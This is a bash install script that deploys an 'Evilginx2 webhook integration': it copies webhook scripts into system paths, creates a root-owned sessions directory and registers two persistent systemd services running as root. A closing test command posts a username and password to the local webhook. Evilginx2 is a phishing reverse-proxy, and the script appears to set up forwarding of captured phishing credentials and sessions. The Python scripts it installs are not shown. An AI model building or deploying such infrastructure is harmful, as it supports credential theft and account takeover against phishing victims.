#!/bin/bash

echo "🔴 Installing Evilginx2 Webhook Integration..."

# Install dependencies
pip3 install flask --break-system-packages

# Copy scripts to system locations
sudo cp custom/webhook/send_msg.py /usr/local/bin/send_msg.py
sudo cp custom/webhook/webhook_receiver.py /usr/local/bin/webhook_receiver.py
sudo cp custom/webhook/evilginx_webhook.py /usr/local/bin/evilginx_webhook.py

# Make them executable
sudo chmod +x /usr/local/bin/send_msg.py
sudo chmod +x /usr/local/bin/webhook_receiver.py
sudo chmod +x /usr/local/bin/evilginx_webhook.py

# Create directories
sudo mkdir -p /root/evilginx_sessions

# Create webhook service
sudo cat > /etc/systemd/system/webhook.service << 'EOF'
[Unit]
Description=Webhook Receiver
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=/usr/bin/python3 /usr/local/bin/webhook_receiver.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Create Evilginx2 webhook service
sudo cat > /etc/systemd/system/evilginx_webhook.service << 'EOF'
[Unit]
Description=Evilginx2 Webhook Integration
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /usr/local/bin/evilginx_webhook.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Start services
sudo systemctl daemon-reload
sudo systemctl enable webhook
sudo systemctl start webhook
sudo systemctl enable evilginx_webhook
sudo systemctl start evilginx_webhook

echo "✅ Webhook integration installed and started!"
echo "🧪 Test with: curl -X POST http://localhost:5001/webhook -H \"Content-Type: application/json\" -d '{\"username\":\"test\",\"password\":\"test\"}'"
